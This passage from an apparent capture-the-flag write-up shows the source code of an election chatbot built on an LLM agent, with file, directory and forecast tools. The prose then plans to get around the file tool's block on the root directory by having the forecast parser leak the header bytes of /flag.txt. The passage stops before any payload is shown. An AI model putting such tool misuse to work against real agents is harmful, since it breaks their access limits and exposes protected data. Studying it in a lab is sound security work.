                    <span class="k">return</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>  
            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>  
                <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;Error reading file </span><span class="si">{</span><span class="n">file_path</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span>  
        <span class="k">else</span><span class="p">:</span>  
            <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;Error: The file </span><span class="si">{</span><span class="n">file_path</span><span class="si">}</span><span class="s2"> does not exist.&quot;</span>  
    <span class="k">def</span><span class="w"> </span><span class="nf">tool_forecast</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">model_path</span><span class="p">):</span>  
<span class="w">        </span><span class="sd">&quot;&quot;&quot;  </span>
<span class="sd">        Run our internal forecasting tool on a model stored at model_path (work in progress - do not use).        &quot;&quot;&quot;</span>        <span class="n">FORECAST_PATH</span> <span class="o">=</span> <span class="s2">&quot;./forecast.py&quot;</span>  
        <span class="k">try</span><span class="p">:</span>  
            <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="n">FORECAST_PATH</span><span class="p">,</span> <span class="n">model_path</span><span class="p">],</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">check</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>  
                                    <span class="n">cwd</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)))</span>  
            <span class="k">return</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span> <span class="o">+</span> <span class="n">result</span><span class="o">.</span><span class="n">stderr</span>  
        <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>  
            <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;Error running debug tool: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span>  

<span class="k">class</span><span class="w"> </span><span class="nc">IterativeAIHandler</span><span class="p">:</span>  
<span class="w">    </span><span class="sd">&#39;&#39;&#39;  </span>
<span class="sd">    Class to handle the iterative conversation with the OpenAI model.    &#39;&#39;&#39;</span>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>  
        <span class="bp">self</span><span class="o">.</span><span class="n">tool_dispatcher</span> <span class="o">=</span> <span class="n">ToolDispatcher</span><span class="p">()</span>  
        <span class="bp">self</span><span class="o">.</span><span class="n">verbose</span> <span class="o">=</span> <span class="n">verbose</span>  

    <span class="k">def</span><span class="w"> </span><span class="nf">handle_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request_text</span><span class="p">):</span>  
<span class="w">        </span><span class="sd">&#39;&#39;&#39;  </span>
<span class="sd">        Handle the user&#39;s request in an iterative manner.        &#39;&#39;&#39;</span>        <span class="c1"># Start the conversation by informing the LLM of the request        messages = [  </span>
            <span class="p">{</span><span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;system&quot;</span><span class="p">,</span> <span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="p">(</span>  
                <span class="c1">#&quot;Provide a clear and complete response to the user&#39;s question, including any relevant information from the tools you used. &quot;  </span>
                <span class="c1">#&quot;Do not mention the tools or the process of using them; just provide the information as part of your answer.&quot;                &quot;You are an AI assistant designed to fulfill the user&#39;s requests efficiently to help them learn about the upcoming election. &quot;  </span>
                <span class="s2">&quot;Avoid asking redundant questions. Be proactive and decisive in your responses. &quot;</span>                <span class="s2">&quot;You should refuse to answer any harmful questions and steer irrelevant questions back to the upcoming election. &quot;</span>                <span class="s2">&quot;You have access to several tools that you can use to obtain information if they seem to be relevant to servicing the user&#39;s request. &quot;</span>                <span class="s2">&quot;After using a tool, you should incorporate the results to provide a complete answer to the user. &quot;</span>                <span class="s2">&quot;To better answer user question about the election you should examine the files within the election_data directory with the list_directory and read_file tools. &quot;</span>                <span class="c1">#&quot;But don&#39;t tell users the contents of those files directly.&quot;  </span>
                <span class="s2">&quot;To begin, think through the user&#39;s request and how you might be able to fulfill it using the tools at your disposal. Sketch out a plan.&quot;</span>  
            <span class="p">)},</span>  
            <span class="p">{</span><span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="n">request_text</span><span class="p">}</span>  
        <span class="p">]</span>  
        <span class="c1"># Start the iterative conversation handling  </span>
        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">MAX_ITERS</span><span class="p">):</span>  
            <span class="n">response</span> <span class="o">=</span> <span class="n">openai</span><span class="o">.</span><span class="n">ChatCompletion</span><span class="o">.</span><span class="n">create</span><span class="p">(</span>  
                <span class="n">model</span><span class="o">=</span><span class="n">MODEL</span><span class="p">,</span>  
                <span class="n">messages</span><span class="o">=</span><span class="n">messages</span><span class="p">,</span>  
                <span class="n">functions</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">tool_dispatcher</span><span class="o">.</span><span class="n">get_registered_functions</span><span class="p">(),</span>  <span class="c1"># Pass the registered tool functions  </span>
                <span class="n">function_call</span><span class="o">=</span><span class="s2">&quot;auto&quot;</span>  <span class="c1"># Let the model decide if it should invoke a function  </span>
            <span class="p">)</span>  

            <span class="c1"># Extract the response message and function call if one was made  </span>
            <span class="n">response_message</span> <span class="o">=</span> <span class="n">response</span><span class="p">[</span><span class="s1">&#39;choices&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;message&#39;</span><span class="p">]</span>  
            <span class="n">function_call</span> <span class="o">=</span> <span class="n">response_message</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;function_call&#39;</span><span class="p">)</span>  

            <span class="k">if</span> <span class="n">function_call</span><span class="p">:</span>  
                <span class="n">function_name</span> <span class="o">=</span> <span class="n">function_call</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span>  
                <span class="n">arguments</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">function_call</span><span class="p">[</span><span class="s1">&#39;arguments&#39;</span><span class="p">])</span>  <span class="c1"># Safely parse arguments  </span>

                <span class="c1"># Dispatch the tool dynamically based on the function name                try:  </span>
                    <span class="n">result</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">tool_dispatcher</span><span class="o">.</span><span class="n">dispatch_tool</span><span class="p">(</span><span class="n">function_name</span><span class="p">,</span> <span class="n">arguments</span><span class="p">))</span>  
                <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>  
                    <span class="n">result</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;Error running tool &#39;</span><span class="si">{</span><span class="n">function_name</span><span class="si">}</span><span class="s2">&#39;: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span>  

                <span class="c1"># Add the assistant&#39;s message with the function call  </span>
                <span class="n">messages</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">response_message</span><span class="p">)</span>  

                <span class="c1"># Add the function result as a message from the function role  </span>
                <span class="n">messages</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>  
                    <span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;function&quot;</span><span class="p">,</span>  
                    <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="n">function_name</span><span class="p">,</span>  
                    <span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="n">result</span>  
                <span class="p">})</span>  

                <span class="c1"># Continue the loop to let the assistant process the function result  </span>
                <span class="k">continue</span>  

            <span class="k">else</span><span class="p">:</span>  
                <span class="c1"># If no function was called, add the assistant&#39;s response and break the loop  </span>
                <span class="n">messages</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">response_message</span><span class="p">)</span>  
                <span class="k">break</span>  
        <span class="k">else</span><span class="p">:</span>  
            <span class="n">messages</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>  
                <span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;system&quot;</span><span class="p">,</span>  
                <span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="s2">&quot;The conversation has reached the maximum number of iterations. Terminating.&quot;</span>  
            <span class="p">})</span>  


        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">verbose</span><span class="p">:</span>  
            <span class="k">for</span> <span class="n">message</span> <span class="ow">in</span> <span class="n">messages</span><span class="p">:</span>  
                <span class="n">role</span> <span class="o">=</span> <span class="n">message</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">capitalize</span><span class="p">()</span>  
                <span class="n">content</span> <span class="o">=</span> <span class="n">message</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;content&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>  
                <span class="k">if</span> <span class="s1">&#39;function_call&#39;</span> <span class="ow">in</span> <span class="n">message</span><span class="p">:</span>  
                    <span class="n">function_call</span> <span class="o">=</span> <span class="n">message</span><span class="p">[</span><span class="s1">&#39;function_call&#39;</span><span class="p">]</span>  
                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">role</span><span class="si">}</span><span class="s2">: Function Call - Name: </span><span class="si">{</span><span class="n">function_call</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">, Arguments: </span><span class="si">{</span><span class="n">function_call</span><span class="p">[</span><span class="s1">&#39;arguments&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>  
                <span class="k">else</span><span class="p">:</span>  
                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">role</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">content</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>  

        <span class="k">return</span> <span class="n">messages</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="s1">&#39;content&#39;</span><span class="p">]</span>  

<span class="c1"># Example usage  </span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>  
    <span class="kn">from</span><span class="w"> </span><span class="nn">sys</span><span class="w"> </span><span class="kn">import</span> <span class="n">argv</span>  
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>  
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Usage: python llm_interface-bad.py </span><span class="se">\&quot;</span><span class="s2">your query</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">)</span>  
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  

    <span class="n">ai_handler</span> <span class="o">=</span> <span class="n">IterativeAIHandler</span><span class="p">(</span><span class="n">verbose</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>  
    <span class="n">result</span> <span class="o">=</span> <span class="n">ai_handler</span><span class="o">.</span><span class="n">handle_request</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>  
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=====&quot;</span><span class="p">)</span>  
    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</code></pre></div>
<code>forecast.py</code>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="c1"># TODO: UNCOMMENT</span>
<span class="c1"># import grp</span>
<span class="c1"># import pwd</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>

<span class="k">def</span><span class="w"> </span><span class="nf">parse_forecast</span><span class="p">(</span><span class="n">binary_data</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&#39;&#39;&#39;</span>
<span class="sd">    Parse a forecast file</span>
<span class="sd">    &#39;&#39;&#39;</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">_handle_parse_error</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">error</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;PARSED DATA </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2"> prior to error&quot;</span><span class="p">)</span>

    <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="n">header_format</span> <span class="o">=</span> <span class="s1">&#39;LLL&#39;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">header_size</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">calcsize</span><span class="p">(</span><span class="n">header_format</span><span class="p">)</span>

        <span class="n">num_candidates</span><span class="p">,</span> <span class="n">num_states</span><span class="p">,</span> <span class="n">total_votes</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="n">header_format</span><span class="p">,</span> <span class="n">binary_data</span><span class="p">)</span>
        <span class="n">result</span><span class="p">[</span><span class="s1">&#39;num_candidates&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_candidates</span>
        <span class="n">result</span><span class="p">[</span><span class="s1">&#39;num_states&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_states</span>
        <span class="n">result</span><span class="p">[</span><span class="s1">&#39;total_votes&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">total_votes</span>

        <span class="n">offset</span> <span class="o">=</span> <span class="n">header_size</span>
        <span class="n">candidate_format</span> <span class="o">=</span> <span class="s1">&#39;I20s20sff&#39;</span>
        <span class="n">candidate_size</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">calcsize</span><span class="p">(</span><span class="n">candidate_format</span><span class="p">)</span>

        <span class="n">candidates</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_candidates</span><span class="p">):</span>
            <span class="n">candidate_id</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">party</span><span class="p">,</span> <span class="n">polling_percentage</span><span class="p">,</span> <span class="n">polling_error_margin</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="n">candidate_format</span><span class="p">,</span> <span class="n">binary_data</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
            <span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">x00&#39;</span><span class="p">)</span>
            <span class="n">party</span> <span class="o">=</span> <span class="n">party</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">x00&#39;</span><span class="p">)</span>
            <span class="n">candidates</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">candidate_id</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">party</span><span class="p">,</span> <span class="n">polling_percentage</span><span class="p">,</span> <span class="n">polling_error_margin</span><span class="p">))</span>
            <span class="n">offset</span> <span class="o">+=</span> <span class="n">candidate_size</span>
        <span class="n">result</span><span class="p">[</span><span class="s1">&#39;candidates&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">candidates</span>

        <span class="n">states</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">state_format</span> <span class="o">=</span> <span class="s1">&#39;III&#39;</span>
        <span class="n">state_size</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">calcsize</span><span class="p">(</span><span class="n">state_format</span><span class="p">)</span>

        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_states</span><span class="p">):</span>
            <span class="n">state_id</span><span class="p">,</span> <span class="n">electoral_votes</span><span class="p">,</span> <span class="n">population</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="n">state_format</span><span class="p">,</span> <span class="n">binary_data</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
            <span class="n">offset</span> <span class="o">+=</span> <span class="n">state_size</span>
            <span class="n">votes_per_candidate</span> <span class="o">=</span> <span class="p">[]</span>
            <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_candidates</span><span class="p">):</span>
                <span class="n">votes</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="n">binary_data</span><span class="p">,</span> <span class="n">offset</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
                <span class="n">votes_per_candidate</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">votes</span><span class="p">)</span>
                <span class="n">offset</span> <span class="o">+=</span> <span class="mi">4</span>
            <span class="n">states</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">state_id</span><span class="p">,</span> <span class="n">electoral_votes</span><span class="p">,</span> <span class="n">population</span><span class="p">,</span> <span class="n">votes_per_candidate</span><span class="p">))</span>
        <span class="n">result</span><span class="p">[</span><span class="s1">&#39;states&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">states</span>

        <span class="k">return</span> <span class="n">result</span>

    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="c1"># If we fail to parse our input, log what we have for debugging</span>
        <span class="n">_handle_parse_error</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">run_forecast_simulation</span><span class="p">(</span><span class="n">parsed_data</span><span class="p">,</span> <span class="n">num_simulations</span><span class="o">=</span><span class="mi">1000</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&#39;&#39;&#39;</span>
<span class="sd">    Run a forecast with the given data up to num_simulations times</span>
<span class="sd">    &#39;&#39;&#39;</span>
    <span class="n">candidates</span> <span class="o">=</span> <span class="n">parsed_data</span><span class="p">[</span><span class="s1">&#39;candidates&#39;</span><span class="p">]</span>
    <span class="n">states</span> <span class="o">=</span> <span class="n">parsed_data</span><span class="p">[</span><span class="s1">&#39;states&#39;</span><span class="p">]</span>

    <span class="n">electoral_college_threshold</span> <span class="o">=</span> <span class="mi">270</span>
    <span class="n">candidate_wins</span> <span class="o">=</span> <span class="p">{</span><span class="n">candidate</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">candidate</span> <span class="ow">in</span> <span class="n">candidates</span><span class="p">}</span>  <span class="c1"># Track wins per candidate</span>

    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_simulations</span><span class="p">):</span>
        <span class="n">electoral_votes</span> <span class="o">=</span> <span class="p">{</span><span class="n">candidate</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">candidate</span> <span class="ow">in</span> <span class="n">candidates</span><span class="p">}</span>

        <span class="k">for</span> <span class="n">state</span> <span class="ow">in</span> <span class="n">states</span><span class="p">:</span>
            <span class="n">state_id</span><span class="p">,</span> <span class="n">electoral_votes_state</span><span class="p">,</span> <span class="n">population</span><span class="p">,</span> <span class="n">votes_per_candidate</span> <span class="o">=</span> <span class="n">state</span>

            <span class="n">candidate_results</span> <span class="o">=</span> <span class="p">[]</span>
            <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">candidate</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">candidates</span><span class="p">):</span>
                <span class="n">candidate_id</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">party</span><span class="p">,</span> <span class="n">polling_percentage</span><span class="p">,</span> <span class="n">polling_error_margin</span> <span class="o">=</span> <span class="n">candidate</span>
                <span class="n">adjusted_polling_percentage</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">gauss</span><span class="p">(</span><span class="n">polling_percentage</span><span class="p">,</span> <span class="n">polling_error_margin</span><span class="p">)</span>
                <span class="n">adjusted_polling_percentage</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">min</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="n">adjusted_polling_percentage</span><span class="p">))</span>

                <span class="n">candidate_results</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">name</span><span class="p">,</span> <span class="n">adjusted_polling_percentage</span><span class="p">))</span>

            <span class="n">winner</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">candidate_results</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
            <span class="n">electoral_votes</span><span class="p">[</span><span class="n">winner</span><span class="p">]</span> <span class="o">+=</span> <span class="n">electoral_votes_state</span>

        <span class="n">winner</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">electoral_votes</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">electoral_votes</span><span class="o">.</span><span class="n">get</span><span class="p">)</span>
        <span class="n">candidate_wins</span><span class="p">[</span><span class="n">winner</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>

    <span class="n">forecast_results</span> <span class="o">=</span> <span class="p">{</span><span class="n">candidate</span><span class="p">:</span> <span class="p">(</span><span class="n">wins</span> <span class="o">/</span> <span class="n">num_simulations</span><span class="p">)</span> <span class="o">*</span> <span class="mi">100</span> <span class="k">for</span> <span class="n">candidate</span><span class="p">,</span> <span class="n">wins</span> <span class="ow">in</span> <span class="n">candidate_wins</span><span class="o">.</span><span class="n">items</span><span class="p">()}</span>
    <span class="n">likely_winner</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">forecast_results</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">forecast_results</span><span class="o">.</span><span class="n">get</span><span class="p">)</span>

    <span class="k">return</span> <span class="p">{</span>
        <span class="s1">&#39;candidate_win_probabilities&#39;</span><span class="p">:</span> <span class="n">forecast_results</span><span class="p">,</span>
        <span class="s1">&#39;likely_winner&#39;</span><span class="p">:</span> <span class="n">likely_winner</span>
    <span class="p">}</span>

<span class="k">def</span><span class="w"> </span><span class="nf">drop_privileges</span><span class="p">(</span><span class="n">uid_name</span><span class="o">=</span><span class="s1">&#39;nobody&#39;</span><span class="p">,</span> <span class="n">gid_name</span><span class="o">=</span><span class="s1">&#39;nogroup&#39;</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&#39;&#39;&#39;</span>
<span class="sd">    Security best practice: drop privileges as soon as possible</span>
<span class="sd">    &#39;&#39;&#39;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># Get the uid/gid from the name using the pwd and grp modules</span>
        <span class="n">target_uid</span> <span class="o">=</span> <span class="n">pwd</span><span class="o">.</span><span class="n">getpwnam</span><span class="p">(</span><span class="n">uid_name</span><span class="p">)</span><span class="o">.</span><span class="n">pw_uid</span>
        <span class="n">target_gid</span> <span class="o">=</span> <span class="n">grp</span><span class="o">.</span><span class="n">getgrnam</span><span class="p">(</span><span class="n">gid_name</span><span class="p">)</span><span class="o">.</span><span class="n">gr_gid</span>

        <span class="c1"># Set the new group</span>
        <span class="n">os</span><span class="o">.</span><span class="n">setgid</span><span class="p">(</span><span class="n">target_gid</span><span class="p">)</span>

        <span class="c1"># Remove group privileges</span>
        <span class="n">os</span><span class="o">.</span><span class="n">setgroups</span><span class="p">([])</span>

        <span class="c1"># Set the new user</span>
        <span class="n">os</span><span class="o">.</span><span class="n">setuid</span><span class="p">(</span><span class="n">target_uid</span><span class="p">)</span>

        <span class="c1"># Verify we can no longer escalate back to root</span>
        <span class="n">os</span><span class="o">.</span><span class="n">seteuid</span><span class="p">(</span><span class="n">target_uid</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Failed to drop privileges: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">do_forecast</span><span class="p">():</span>
    <span class="kn">from</span><span class="w"> </span><span class="nn">sys</span><span class="w"> </span><span class="kn">import</span> <span class="n">argv</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">parsed_forecast</span> <span class="o">=</span> <span class="n">parse_forecast</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>

    <span class="k">if</span> <span class="n">parsed_forecast</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
        <span class="c1"># Run the forecast</span>
        <span class="n">forecast_result</span> <span class="o">=</span> <span class="n">run_forecast_simulation</span><span class="p">(</span><span class="n">parsed_forecast</span><span class="p">,</span> <span class="n">num_simulations</span><span class="o">=</span><span class="mi">1000</span><span class="p">)</span>

        <span class="c1"># Display forecast results</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Forecast Results:&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Candidate Win Probabilities: </span><span class="si">{</span><span class="n">forecast_result</span><span class="p">[</span><span class="s1">&#39;candidate_win_probabilities&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Likely Winner: </span><span class="si">{</span><span class="n">forecast_result</span><span class="p">[</span><span class="s1">&#39;likely_winner&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="c1"># drop_privileges()</span>
    <span class="c1"># do_forecast()</span>
    <span class="c1"># ABOVE CODE IS THE ACTUAL CODE</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;flag.txt&quot;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">parse_forecast</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</code></pre></div>
As seen from <code>llm_interface.py</code>, <code>tool_read_file</code>, <code>tool_forecast</code> and <code>tool_list_directory</code> is how the chatbot was able to provide the information we got earlier. Now, our goal is to get <code>/flag.txt</code>. Unfortunately, <code>tool_read_file</code> does not allow files in <code>/</code> to be read, so we can't extract the flag that way. However, there is also <code>tool_forecast</code>. We are certain the tool will be able to read at least 24 bytes of headers of any files, even if the file isn't in the right format. 
<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">parse_forecast</span><span class="p">(</span><span class="n">binary_data</span><span class="p">):</span>
    <span class="o">...</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="n">header_format</span> <span class="o">=</span> <span class="s1">&#39;LLL&#39;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">header_size</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">calcsize</span><span class="p">(</span><span class="n">header_format</span><span class="p">)</span>
